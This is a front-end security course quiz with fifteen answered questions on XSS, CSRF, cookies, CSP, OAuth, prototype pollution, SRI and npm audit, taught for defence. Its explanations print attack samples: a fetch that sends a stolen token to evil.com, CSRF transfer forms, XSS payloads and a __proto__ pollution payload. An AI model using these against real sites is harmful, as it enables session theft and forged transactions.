# Chapter 15 Quiz: Security Essentials for Front-End Developers

**Time Limit:** 30 minutes
**Passing Score:** 80% (12/15 correct)
**Format:** Multiple choice, some questions may have multiple correct answers

---

## Questions

### 1. Which of the following is the MOST secure way to render user-generated content in React?

A) `<div>{userContent}</div>`
B) `<div dangerouslySetInnerHTML={{ __html: userContent }} />`
C) `<div>{DOMPurify.sanitize(userContent)}</div>`
D) `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />`

<details>
<summary>Answer & Explanation</summary>

**Correct Answer: D**

**Explanation:**
- **A is good** for plain text, but won't preserve HTML formatting if needed
- **B is dangerous** - renders raw HTML without sanitization (XSS vulnerable!)
- **C won't work** - DOMPurify.sanitize() returns HTML string, but `{string}` escapes it
- **D is correct** - Sanitizes HTML with DOMPurify AND renders it with dangerouslySetInnerHTML

**When to use each:**
- Use A for plain text (usernames, titles)
- Use D for rich text (comments, blog posts with formatting)
- Never use B without sanitization!

**Example:**
```javascript
// User input: <p>Hello <script>alert('XSS')</script></p>

// Option A output: <p>Hello <script>alert('XSS')</script></p> (displayed as text)
// Option D output: <p>Hello </p> (script removed, HTML preserved)
```
</details>

---

### 2. What are the three required attributes for secure session cookies?

A) `httpOnly`, `secure`, `sameSite`
B) `httpOnly`, `path`, `domain`
C) `secure`, `expires`, `maxAge`
D) `sameSite`, `domain`, `path`

<details>
<summary>Answer & Explanation</summary>

**Correct Answer: A**

**Explanation:**

**Required for security:**
- **`httpOnly: true`** - Prevents JavaScript from accessing the cookie (protects against XSS)
- **`secure: true`** - Cookie only sent over HTTPS (protects against MITM attacks)
- **`sameSite: 'Lax' or 'Strict'`** - Prevents CSRF attacks

**Example:**
```javascript
res.cookie('sessionToken', token, {
  httpOnly: true,   // ✅ JavaScript can't read
  secure: true,     // ✅ HTTPS only
  sameSite: 'Lax',  // ✅ CSRF protection
  maxAge: 3600000   // Optional: 1 hour expiration
});
```

**Why other options are wrong:**
- B, C, D include `path`, `domain`, `expires`, `maxAge` which are useful but not security-critical
- Without `httpOnly`, XSS can steal cookies
- Without `secure`, cookies sent over HTTP (man-in-the-middle can intercept)
- Without `sameSite`, vulnerable to CSRF attacks
</details>

---

### 3. Which CSP directive blocks inline JavaScript like `<script>alert('XSS')</script>`?

A) `default-src 'self'`
B) `script-src 'self'`
C) `script-src 'unsafe-inline'`
D) `connect-src 'self'`

<details>
<summary>Answer & Explanation</summary>

**Correct Answer: B**

**Explanation:**

**`script-src 'self'`** means:
- Only load scripts from same origin
- Block inline scripts (like `<script>...</script>`)
- Block `eval()` and similar dangerous functions

**Why it works:**
```html
<!-- CSP: script-src 'self' -->

<!-- ❌ BLOCKED: Inline script -->
<script>alert('XSS')</script>

<!-- ❌ BLOCKED: Inline event handler -->
<button onclick="alert('XSS')">Click</button>

<!-- ✅ ALLOWED: External script from same origin -->
<script src="/app.js"></script>

<!-- ❌ BLOCKED: External script from other origin -->
<script src="https://evil.com/bad.js"></script>
```

**Why other options are wrong:**
- A (`default-src`) applies to all resources, not specifically scripts
- C (`'unsafe-inline'`) actually ALLOWS inline scripts (weakens security!)
- D (`connect-src`) controls fetch/XHR destinations, not scripts
</details>

---

### 4. What is the purpose of a CSRF token?

A) To encrypt data sent to the server
B) To prove the request came from your app, not a malicious site
C) To authenticate the user
D) To prevent XSS attacks

<details>
<summary>Answer & Explanation</summary>

**Correct Answer: B**

**Explanation:**

**CSRF tokens prove request origin:**

Without CSRF protection, attacker can do this:
```html
<!-- Evil.com -->
<img src="https://yourbank.com/transfer?to=attacker&amount=10000">
<!-- User's browser sends cookies with this request! -->
```

With CSRF tokens:
```javascript
// Your app
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken  // ✅ Attacker can't get this!
  },
  body: JSON.stringify({ to: 'recipient', amount: 100 })
});

// Server
if (req.headers['x-csrf-token'] !== req.session.csrfToken) {
  return res.status(403).json({ error: 'Invalid CSRF token' });
}
```

**Why it works:**
- Attacker can make your browser send cookies (due to `SameSite` not being strict)
- BUT attacker **cannot read** your CSRF token (due to Same-Origin Policy)
- Server rejects requests without valid token

**Why other options are wrong:**
- A: CSRF tokens don't encrypt (use HTTPS for encryption)
- C: CSRF tokens don't authenticate (cookies/JWTs do that)
- D: CSRF tokens don't prevent XSS (CSP and sanitization do)
</details>

---

### 5. Where should you store authentication tokens in an SPA?

A) `localStorage` - easiest to use
B) `sessionStorage` - cleared on tab close
C) HttpOnly cookies - protected from JavaScript
D) In-memory (React state) + HttpOnly refresh token

<details>
<summary>Answer & Explanation</summary>

**Correct Answer: D** (with C being acceptable)

**Explanation:**

**Security comparison:**

| Storage Method | XSS Theft | CSRF Risk | Persists | Best For |
|---------------|-----------|-----------|----------|----------|
| localStorage | ❌ YES | ✅ No | Yes | ❌ DON'T USE |
| sessionStorage | ❌ YES | ✅ No | Tab only | ❌ DON'T USE |
| HttpOnly cookie | ✅ Protected | ⚠️ Yes* | Yes | ✅ Good |
| Memory + HttpOnly refresh | ✅ Protected | ✅ No** | No | ✅ BEST |

*Mitigated with `SameSite` and CSRF tokens
**Access token in memory, refresh token in HttpOnly cookie

**Best practice implementation:**
```javascript
// ✅ BEST: Access token in memory, refresh token in HttpOnly cookie
const [accessToken, setAccessToken] = useState(null);

// On login
const login = async () => {
  const response = await fetch('/api/login', {
    method: 'POST',
    credentials: 'include' // Server sets HttpOnly refresh token cookie
  });
  const { accessToken } = await response.json();
  setAccessToken(accessToken); // In memory only
};

// Auto-refresh when expired
useEffect(() => {
  if (tokenExpired(accessToken)) {
    refreshAccessToken(); // Uses HttpOnly refresh token
  }
}, [accessToken]);
```

**Why localStorage/sessionStorage are bad:**
```javascript
// ❌ DON'T DO THIS
localStorage.setItem('token', token);

// XSS can steal it:
fetch('https://evil.com/steal?token=' + localStorage.getItem('token'));
```
</details>

---

### 6. Which URL should be blocked in user-provided links?

A) `https://example.com`
B) `javascript:alert('XSS')`
C) `http://example.com`
D) `mailto:user@example.com`

<details>
<summary>Answer & Explanation</summary>

**Correct Answer: B**

**Explanation:**

**Dangerous URL protocols:**
- `javascript:` - Executes JavaScript when clicked
- `data:text/html,<script>...</script>` - Renders HTML with scripts
- `vbscript:` - Executes VBScript (old IE)

**Safe URL validator:**
```javascript
function isSafeUrl(url) {
  try {
    const parsed = new URL(url);
    // Only allow http, https, mailto
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
  } catch {
    return false; // Invalid URL
  }
}

// Usage
const userWebsite = 'javascript:alert("XSS")';
const safeUrl = isSafeUrl(userWebsite) ? userWebsite : '#';

<a href={safeUrl}>Visit</a>
```

**Why it's dangerous:**
```html
<!-- User input: javascript:alert(document.cookie) -->
<a href="javascript:alert(document.cookie)">Click me</a>
<!-- Clicking executes the JavaScript! -->
```

**Why other options are acceptable:**
- A: HTTPS is safe (preferred)
- C: HTTP is less secure but not XSS (warn user about insecure connection)
- D: mailto is safe for email links
</details>

---

### 7. What is the difference between Stored XSS and Reflected XSS?

A) Stored XSS is permanent, Reflected XSS is temporary
B) Stored XSS affects all users, Reflected XSS affects one user
C) Stored XSS is in database, Reflected XSS is in URL
D) All of the above

<details>
<summary>Answer & Explanation</summary>

**Correct Answer: D**

**Explanation:**

**Stored XSS (Persistent):**
```javascript
// User posts malicious comment
POST /api/comments
{ "text": "<script>steal(document.cookie)</script>" }

// Stored in database
db.comments.insert({ text: "<script>..." });

// Everyone who views this comment gets attacked!
```

**Characteristics:**
- ✅ Stored in database
- ✅ Permanent (until removed)
- ✅ Affects all users who view it
- ⚠️ Most dangerous

**Reflected XSS (Non-Persistent):**
```javascript
// Malicious URL
https://example.com/search?q=<script>alert('XSS')</script>

// Server reflects it in response
<h1>Results for: <script>alert('XSS')</script></h1>

// Only affects users who click this specific link
```

**Characteristics:**
- ✅ In URL parameters/form data
- ✅ Temporary (one request)
- ✅ Only affects one user per link
- ⚠️ Requires tricking user to click link

**DOM-Based XSS (Client-side):**
```javascript
// URL: #<img src=x onerror="alert('XSS')">
const content = location.hash.slice(1);
document.getElementById('output').innerHTML = content; // ❌ XSS!
```

**Prevention is the same for all types:** Sanitize + escape!
</details>

---

### 8. What does the `Strict-Transport-Security` header do?

A) Blocks all HTTP traffic
B) Forces browsers to use HTTPS for future requests
C) Encrypts cookies
D) Prevents clickjacking

<details>
<summary>Answer & Explanation</summary>

**Correct Answer: B**

**Explanation:**

**HSTS (HTTP Strict Transport Security):**
```javascript
// Server sends header
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**What it does:**
1. Browser remembers "this site requires HTTPS"
2. For next 31536000 seconds (1 year), browser **automatically upgrades** HTTP to HTTPS
3. User can't click through certificate warnings

**Example:**
```javascript
// Without HSTS
User types: http://bank.com
Browser loads: http://bank.com ❌ (insecure!)

// With HSTS (after first HTTPS visit)
User types: http://bank.com
Browser automatically loads: https://bank.com ✅ (secure!)
```

**Why it matters:**
- Prevents MITM attacks when user types URL without https://
- Prevents SSL stripping attacks
- Protects even if user clicks HTTP link

**Full header explained:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
                          ↑                  ↑                   ↑
                          1 year             Apply to subdomains  Add to browser preload list
```

**Why other options are wrong:**
- A: Doesn't block, just upgrades HTTP → HTTPS
- C: Doesn't encrypt cookies (HTTPS does, `Secure` flag helps)
- D: Doesn't prevent clickjacking (`X-Frame-Options` / `frame-ancestors` does)
</details>

---

### 9. Which is the most secure way to implement OAuth in an SPA?

A) Implicit Flow
B) Client Credentials Flow
C) Authorization Code Flow with PKCE
D) Password Grant Flow

<details>
<summary>Answer & Explanation</summary>

**Correct Answer: C**

**Explanation:**

**Authorization Code Flow with PKCE (Proof Key for Code Exchange):**

**Why it's secure:**
- No client secret in front-end (can't keep secrets in JavaScript!)
- PKCE prevents authorization code interception
- Recommended by OAuth 2.0 security best practices

**How it works:**
```javascript
// 1. Generate code verifier + challenge
const verifier = generateRandom();
const challenge = sha256(verifier);

// 2. Redirect to auth server
window.location = `https://auth.example.com/authorize?
  client_id=abc123
  &code_challenge=${challenge}
  &code_challenge_method=S256`;

// 3. User approves, redirected back with code
const code = new URL(location).searchParams.get('code');

// 4. Exchange code for token (with verifier)
fetch('/token', {
  method: 'POST',
  body: JSON.stringify({
    code,
    code_verifier: verifier  // ✅ Proves you initiated the flow
  })
});
```

**Why other flows are insecure for SPAs:**

**A - Implicit Flow:**
- ❌ DEPRECATED for SPAs
- ❌ Token in URL fragment (can leak via Referer header)
- ❌ No refresh tokens
- ❌ Vulnerable to token interception

**B - Client Credentials:**
- ❌ Requires client secret (can't hide in JavaScript!)
- ❌ For machine-to-machine, not user authentication

**D - Password Grant:**
- ❌ DEPRECATED
- ❌ App handles user's password directly (bad UX, security risk)
- ❌ Doesn't support MFA
</details>

---

### 10. What is prototype pollution and how do you prevent it?

A) Modifying Object.prototype; prevent by using Object.create(null)
B) Adding properties to arrays; prevent by using const
C) Creating too many objects; prevent by garbage collection
D) Circular references; prevent by JSON.stringify

<details>
<summary>Answer & Explanation</summary>

**Correct Answer: A**

**Explanation:**

**Prototype Pollution Attack:**
```javascript
// Vulnerable deep merge
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attacker sends malicious JSON
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, malicious);

// Now ALL objects are "admin"!
const user = {};
console.log(user.isAdmin); // true 😱
```

**Prevention methods:**

**1. Use Object.create(null):**
```javascript
const safeObj = Object.create(null);
safeObj['__proto__'] = 'value'; // Just a regular property, no pollution
```

**2. Block dangerous keys:**
```javascript
function safeMerge(target, source) {
  for (let key in source) {
    if (['__proto__', 'constructor', 'prototype'].includes(key)) {
      continue; // Skip dangerous keys
    }
    // ... rest of merge
  }
}
```

**3. Use Map instead of objects:**
```javascript
const map = new Map();
map.set('__proto__', 'value'); // Safe, no prototype
```

**4. Use safe libraries:**
```javascript
// Lodash (>= 4.17.11) is protected
const _ = require('lodash');
_.merge({}, untrustedData); // Safe
```

**Real-world impact:**
- 2019: Many npm packages vulnerable (jquery, lodash < 4.17.11)
- Can lead to authentication bypass
- Can lead to RCE in some cases
</details>

---

### 11. What should you do before deploying to production? (Select all that apply)

A) Run `npm audit` and fix critical vulnerabilities
B) Configure Content Security Policy
C) Set `secure: true` on cookies
D) Remove all console.log statements

<details>
<summary>Answer & Explanation</summary>

**Correct Answers: A, B, C** (D is optional)

**Explanation:**

**A - npm audit (Critical!):**
```bash
npm audit
npm audit fix

# CI/CD integration
npm audit --audit-level=high || exit 1
```

**Why:** Known vulnerabilities = easy targets for attackers

**B - Content Security Policy (Critical!):**
```javascript
Content-Security-Policy: default-src 'self'; script-src 'self'; ...
```

**Why:** Strongest defense against XSS attacks

**C - Secure cookies (Critical if using cookies):**
```javascript
res.cookie('session', token, {
  httpOnly: true,
  secure: true,      // ✅ HTTPS only in production
  sameSite: 'Lax'
});
```

**Why:** Without `secure: true`, cookies sent over HTTP (MITM can steal)

**D - Remove console.log (Optional):**
```javascript
// Can leak sensitive info
console.log('User password:', password); // ❌ BAD

// But harmless logs are fine
console.log('App initialized'); // ✅ OK
```

**Complete deployment checklist:**
- [ ] npm audit passes
- [ ] CSP configured
- [ ] Cookies have secure, httpOnly, sameSite
- [ ] HTTPS enforced (HSTS)
- [ ] Security headers present
- [ ] Secrets in environment variables (not code)
- [ ] Error messages don't leak details
- [ ] Input validation on client AND server
</details>

---

### 12. What is the purpose of Subresource Integrity (SRI)?

A) To compress JavaScript files
B) To verify CDN scripts haven't been tampered with
C) To encrypt data in transit
D) To minify CSS files

<details>
<summary>Answer & Explanation</summary>

**Correct Answer: B**

**Explanation:**

**SRI (Subresource Integrity) verifies file integrity:**

**Problem without SRI:**
```html
<script src="https://cdn.example.com/library.js"></script>
<!-- What if CDN is compromised? Browser blindly executes malicious code! -->
```

**Solution with SRI:**
```html
<script
  src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"
  integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We"
  crossorigin="anonymous">
</script>
```

**How it works:**
1. Generate hash of file: `sha384-KyZ...`
2. Browser downloads file from CDN
3. Browser computes hash of downloaded file
4. If hashes don't match → **BLOCKED!**

**Generate SRI hash:**
```bash
# Using openssl
curl https://cdn.example.com/lib.js | openssl dgst -sha384 -binary | openssl base64 -A

# Or use: https://www.srihash.org/
```

**When to use:**
- ✅ All CDN scripts and stylesheets
- ✅ Third-party libraries
- ✅ Any external resources

**Real-world protection:**
- 2018: British Airways breach - attackers modified CDN script
- SRI would have blocked the malicious code!

**Why other options are wrong:**
- A, D: SRI doesn't compress/minify (build tools do)
- C: SRI doesn't encrypt (HTTPS does)
</details>

---

### 13. Which of these is vulnerable to XSS?

A) `element.textContent = userInput`
B) `element.innerHTML = userInput`
C) `<div>{userInput}</div>` (React)
D) `element.setAttribute('href', userInput)`

<details>
<summary>Answer & Explanation</summary>

**Correct Answers: B and D** (both vulnerable!)

**Explanation:**

**B - innerHTML (VERY DANGEROUS):**
```javascript
const userInput = '<img src=x onerror="alert(\'XSS\')">';
element.innerHTML = userInput; // ❌ XSS! Script executes
```

**D - setAttribute with href (DANGEROUS):**
```javascript
const userInput = 'javascript:alert("XSS")';
element.setAttribute('href', userInput); // ❌ XSS when clicked!
```

**A - textContent (SAFE):**
```javascript
const userInput = '<script>alert("XSS")</script>';
element.textContent = userInput; // ✅ Safe! Displayed as text, not executed
// Renders: <script>alert("XSS")</script> (visible as text)
```

**C - React JSX (SAFE):**
```javascript
const userInput = '<script>alert("XSS")</script>';
<div>{userInput}</div> // ✅ Safe! React auto-escapes
// Renders: &lt;script&gt;alert("XSS")&lt;/script&gt;
```

**Safe vs Unsafe summary:**

| Method | User Input | XSS Risk |
|--------|-----------|----------|
| `textContent` | `<script>...</script>` | ✅ Safe |
| `innerHTML` | `<script>...</script>` | ❌ XSS! |
| `{userInput}` (React) | `<script>...</script>` | ✅ Safe |
| `dangerouslySetInnerHTML` | `<script>...</script>` | ❌ XSS! |
| `setAttribute('href', ...)` | `javascript:alert()` | ❌ XSS! |

**Safe setAttribute:**
```javascript
function safeSetHref(element, url) {
  const parsed = new URL(url);
  if (['http:', 'https:'].includes(parsed.protocol)) {
    element.setAttribute('href', url); // ✅ Safe after validation
  }
}
```
</details>

---

### 14. What does SameSite=Lax prevent?

A) XSS attacks
B) CSRF attacks via POST requests from other sites
C) CSRF attacks via all requests from other sites
D) SQL injection

<details>
<summary>Answer & Explanation</summary>

**Correct Answer: B**

**Explanation:**

**SameSite cookie attribute values:**

| Value | Cross-Site GET | Cross-Site POST | Description |
|-------|---------------|----------------|-------------|
| `None` | ✅ Sent | ✅ Sent | Cookie always sent (requires `Secure`) |
| `Lax` | ✅ Sent | ❌ NOT sent | Sent on top-level navigation GET only |
| `Strict` | ❌ NOT sent | ❌ NOT sent | Cookie NEVER sent cross-site |

**SameSite=Lax prevents POST-based CSRF:**
```javascript
// Set cookie
res.cookie('session', token, {
  httpOnly: true,
  sameSite: 'Lax'  // ✅ CSRF protection
});

// Attack attempt from evil.com
```

```html
<!-- evil.com -->
<form action="https://yourbank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>

<!-- Cookie NOT sent! ❌ Attack fails -->
```

**But allows legitimate top-level navigation:**
```html
<!-- Clicking link on google.com -->
<a href="https://yourapp.com/dashboard">Go to app</a>
<!-- Cookie IS sent ✅ User stays logged in -->
```

**SameSite=Strict (even stricter):**
```javascript
sameSite: 'Strict'
// Cookie NEVER sent from other sites, even legitimate links
// User must re-login when clicking links from email, Google, etc.
// Too strict for most apps!
```

**Why other options are wrong:**
- A: SameSite doesn't prevent XSS (CSP and sanitization do)
- C: Lax allows GET requests (Strict blocks all)
- D: SameSite doesn't prevent SQL injection (parameterized queries do)

**Best practice:**
```javascript
res.cookie('session', token, {
  httpOnly: true,    // Prevents XSS theft
  secure: true,      // HTTPS only
  sameSite: 'Lax'    // Prevents CSRF
});
```
</details>

---

### 15. When auditing dependencies, which vulnerability severity requires immediate action?

A) Low
B) Moderate
C) High
D) Critical

<details>
<summary>Answer & Explanation</summary>

**Correct Answers: C and D** (both require immediate action)

**Explanation:**

**npm audit severity levels:**

| Severity | Description | Action | Timeline |
|----------|-------------|--------|----------|
| **Critical** | Remote Code Execution, SQL Injection | ⚠️ **FIX IMMEDIATELY** | Same day |
| **High** | XSS, Prototype Pollution, Auth bypass | ⚠️ **FIX IMMEDIATELY** | 1-3 days |
| **Moderate** | DoS, ReDoS, Info disclosure | ⚠️ Fix soon | 1-2 weeks |
| **Low** | Minor issues, unlikely exploitation | Track | Next sprint |

**Example audit output:**
```bash
npm audit

found 5 vulnerabilities (1 low, 2 moderate, 1 high, 1 critical)
  run `npm audit fix` to fix them, or `npm audit` for details

Critical: Remote Code Execution
Package: serialize-javascript
Patched in: >=3.1.0
Dependency of: terser-webpack-plugin
Path: terser-webpack-plugin > serialize-javascript
```

**Immediate actions for Critical/High:**
```bash
# Try auto-fix
npm audit fix

# If that doesn't work, fix with breaking changes
npm audit fix --force

# If still not fixed, manually update
npm install package@latest

# Last resort: find alternative package
npm uninstall vulnerable-package
npm install safe-alternative
```

**CI/CD integration:**
```yaml
# .github/workflows/security.yml
- name: Security Audit
  run: npm audit --audit-level=high
  # Fails CI if high or critical vulnerabilities found
```

**production deployment blockers:**
```json
// package.json
{
  "scripts": {
    "predeploy": "npm audit --audit-level=high || exit 1"
  }
}
```

**Real-world example:**
- 2021: `ua-parser-js` (7M weekly downloads) had critical malware
- Apps using it without auditing = compromised
- Apps with `npm audit` in CI = caught before deployment

**Best practices:**
- [ ] Run `npm audit` before every deploy
- [ ] Set up Dependabot for auto-updates
- [ ] Use Snyk for continuous monitoring
- [ ] Pin critical packages to exact versions
- [ ] Review update changelogs before applying
</details>

---

## Scoring

- **15/15 (100%)**: Security Expert! 🔒
- **13-14 (87-93%)**: Excellent understanding
- **12 (80%)**: Passing - Good foundation
- **10-11 (67-73%)**: Review key concepts
- **< 10 (< 67%)**: Re-read chapter and practice exercises

---

## What's Next?

- **Scored 80%+**: Move on to Chapter 16: Build Tools & Deployment
- **Scored < 80%**: Review chapter sections and retry quiz

---

## Additional Practice

- Complete the Challenge Project: Security Audit & Hardening
- Try [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- Play [Google XSS Game](https://xss-game.appspot.com/)
- Read [OWASP Top 10](https://owasp.org/www-project-top-ten/)

**Keep building secure applications!** 🚀🔒

